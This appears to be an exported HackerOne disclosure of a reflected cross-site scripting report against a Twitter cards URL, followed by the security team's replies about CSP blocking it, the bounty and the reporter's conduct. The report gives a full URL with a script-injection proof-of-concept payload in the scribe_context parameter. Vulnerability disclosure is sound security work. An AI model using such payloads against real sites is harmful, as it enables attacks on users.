title: Cross-site scripting (reflected)

profile.name: Twitter
profile.about: Twitter helps you create and share ideas and information instantly, without barriers.

vulnerability_information:
hi Twitter team

https://twitter.com/i/cards/tfw/v1/788663483873263617?cardname=player&autoplay_disabled=true&forward=true&earned=true&lang=en&card_height=130&scribe_context=l4tqu%3c%2fscript%3e%3cscript%3ealert(1)%3c%2fscript%3eo7gyv

The value of the scribe_context request parameter is copied into a JavaScript string which is encapsulated in double quotation marks. The payload l4tqu</script><script>alert(1)</script>o7gyv was submitted in the scribe_context parameter. This input was echoed unmodified in the application's response.

activities.message:
Thank you for your reports.

When attempting to reproduce this issue, it appears that the Content Security Policy (CSP) prevents the Javascript from triggering. Are you able to demonstrate a bypass for this CSP protection and execute Javascript on the Twitter domain? Any additional information that you can provide will help us further investigate this report.

Thank you for thinking of Twitter security.
activities.markdown_message:
Thank you for your reports.

When attempting to reproduce this issue, it appears that the Content Security Policy (CSP) prevents the Javascript from triggering. Are you able to demonstrate a bypass for this CSP protection and execute Javascript on the Twitter domain? Any additional information that you can provide will help us further investigate this report.

Thank you for thinking of Twitter security.

activities.message:
Hi @linkks ,

We do not offer bonuses for the resolution of reports. The amount we have given you as a bounty here is fair and will not be changed. Also please remember that it may take us some time to respond- in the future, do not continue spamming us with messages as you have done across the multiple reports you submitted.

Thanks for thinking of Twitter's security!
activities.markdown_message:

Also please remember that it may take us some time to respond- in the future, do not continue spamming us with messages as you have done across the multiple reports you submitted.

activities.message:
While it can be frustrating to be unable to send additional reports in, please take this time to put together a detailed report fully describing the impact of the vulnerability you intend to report. [see this report](https://hackerone.com/reports/108113) as an example of a well-written report. You should only need to use the comment feature to make minor corrections to your report, and not to report entirely new vulnerabilities.

On a final note please refrain from mentioning people who aren’t working on your report in the report or messaging members of the Twitter security team outside of HackerOne. If you feel that a report hasn’t been looked at fairly you may request mediation from HackerOne which will ensure it gets looked at.

Thanks for thinking of Twitter security!
activities.markdown_message:
While it can be frustrating to be unable to send additional reports in, please take this time to put together a detailed report fully describing the impact of the vulnerability you intend to report. see this report as an example of a well-written report. You should only need to use the comment feature to make minor corrections to your report, and not to report entirely new vulnerabilities.

On a final note please refrain from mentioning people who aren’t working on your report in the report or messaging members of the Twitter security team outside of HackerOne. If you feel that a report hasn’t been looked at fairly you may request mediation from HackerOne which will ensure it gets looked at.

Thanks for thinking of Twitter security!
